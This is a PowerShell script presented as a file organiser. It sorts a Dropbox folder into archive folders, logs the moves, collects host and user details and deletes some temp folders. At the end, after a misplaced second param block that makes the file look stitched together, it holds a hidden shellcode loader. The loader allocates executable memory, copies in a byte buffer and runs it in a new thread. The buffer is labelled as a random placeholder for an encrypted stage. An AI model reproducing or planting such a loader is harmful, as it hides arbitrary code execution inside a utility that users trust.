
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$SourcePath = 'D:\Dropbox\Incoming',
    [string]$DestinationRoot = "D:\Archive\Sorted",
    [string]$LogPath = "C:\Logs\organise-2026-02-19.log",
    [switch]$DryRun
)

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$map = @{
    '.pdf'  = 'Documents'
    '.docx' = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.jpg'  = 'Images'
    '.zip'  = 'Archives'
    '.log'  = 'Logs'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
$moved = @()
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    if (-not (Test-Path -LiteralPath $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }
    $target = Join-Path $folder $file.Name
    if (Test-Path -LiteralPath $target) {
        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
    }
    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
    $moved += [pscustomobject]@{
        Source  = $file.FullName
        Target  = $target
        MovedAt = Get-Date
    }
}

$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
    Sort-Object -Property Count -Descending
$byFolder | Format-Table Name, Count -AutoSize

$sizes = $files | Measure-Object -Property Length -Sum
Write-Verbose ("Total size: {0:N1} MB" -f ($sizes.Sum / 1MB))

$undoPath = $LogPath.Replace('.log', '-undo.csv')
$moved | Export-Csv -Path $undoPath -NoTypeInformation -Encoding UTF8
Write-Verbose ("Undo file: {0}" -f $undoPath)

$duplicates = $files | Group-Object -Property Name | Where-Object { $_.Count -gt 1 }
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate file names in source: {0}" -f @($duplicates).Count)
}
$skipped = @(Get-ChildItem -LiteralPath $SourcePath -File |
    Where-Object { -not $map.ContainsKey($_.Extension.ToLower()) }).Count
Write-Verbose ("Skipped unknown extensions: {0}" -f $skipped)

$style = @'
<style>
body { font-family: Segoe UI; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #f0f0f0; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@
$byFolder | ConvertTo-Html -Title 'Organiser summary' -Head $style |
    Set-Content -Path $LogPath.Replace('.log', '.html') -Encoding UTF8

$logLine = "{0} organised {1} files" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), @($moved).Count
Add-Content -Path $LogPath -Value $logLine -Encoding UTF8
Write-Host ("Organiser finished: {0} files" -f @($moved).Count) -ForegroundColor Green

$largeFiles = $files | Sort-Object -Property Length -Descending | Select-Object -First 5
$largeFiles | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize

$oldFiles = Get-ChildItem -LiteralPath $SourcePath -File |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-90) }
Write-Verbose ("Files older than 90 days: {0}" -f @($oldFiles).Count)

$emptyFolders = Get-ChildItem -LiteralPath $SourcePath -Directory -Force |
    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force).Count -eq 0 }
Write-Verbose ("Empty source folders: {0}" -f @($emptyFolders).Count)

$hashList = foreach ($item in $files | Select-Object -First 10) {
    [pscustomobject]@{ Name = $item.Name; Hash = (Get-FileHash -LiteralPath $item.FullName -Algorithm SHA256).Hash }
}
$hashList | Format-Table Name -AutoSize

$freeSpace = Get-PSDrive -Name ($DestinationRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
if ($freeSpace) {
    Write-Verbose ("Destination free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)

[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0xf0, 0x52, 0xa5, 0xc7, 0x4b, 0x0b, 0xe3, 0x5d, 0x09, 0x0e, 0x04, 0x39, 0x00, 0x77, 0x86, 0x77,
    0x45, 0xd7, 0x20, 0x6f, 0xb4, 0x0d, 0x5b, 0x8a, 0xbc, 0x09, 0xbd, 0x54, 0x89, 0x1d, 0x26, 0x8f,
    0x36, 0x4a, 0xed, 0x67, 0x68, 0xa6, 0x9e, 0x5b, 0x78, 0xbc, 0x54, 0x87, 0x20, 0x4b, 0x10, 0x92,
    0x6e, 0x5c, 0xd7, 0x25, 0x1d, 0xaf, 0x06, 0x85, 0x23, 0x0d, 0x64, 0x89, 0x76, 0x2d, 0x15, 0x21,
    0x0b, 0x44, 0xbd, 0x2d, 0xda, 0xfd, 0x75, 0x99, 0x3c, 0xbf, 0x36, 0x98, 0x58, 0x16, 0x73, 0x09,
    0x14, 0x58, 0x8c, 0x50, 0xe9, 0x37, 0xf8, 0x3c, 0xc0, 0x86, 0x12, 0x76, 0x48, 0x13, 0x0c, 0x37,
    0x36, 0xed, 0x8f, 0x7f, 0xd7, 0x9f, 0xed, 0x0d, 0x38, 0x48, 0x50, 0xbf, 0x29, 0xcd, 0x82, 0x21,
    0xc7, 0x77, 0x4f, 0x8e, 0xe3, 0x71, 0x0e, 0x57, 0x27, 0x7b, 0x27, 0x89, 0x5c, 0x84, 0xf1, 0xd5,
    0x3d, 0x67, 0xad, 0x6d, 0xa7, 0x5a, 0x3e, 0x30, 0xdd, 0x60, 0x97, 0x06, 0x8a, 0xa3, 0x94, 0xf4,
    0x62, 0x26, 0xb5, 0x7a, 0xa8, 0x4e, 0xb3, 0xf5, 0xaf, 0xd2, 0x88, 0xb4, 0x71, 0x3d, 0x21, 0x64,
    0x56, 0x75, 0x52, 0x19, 0x78, 0x08, 0x91, 0x06, 0xf6, 0x78, 0x71, 0xdb, 0x93, 0xf4, 0x2f, 0x2c,
    0x78, 0xa0, 0x6d, 0xa2, 0xe7, 0x4f, 0x54, 0x52, 0x1c, 0x9d, 0x31, 0x3e, 0x13, 0x37, 0x9b, 0x77,
    0x14, 0x8c, 0x86, 0x87, 0x69, 0x6d, 0x11, 0xc2
)

$Handle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 1041)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
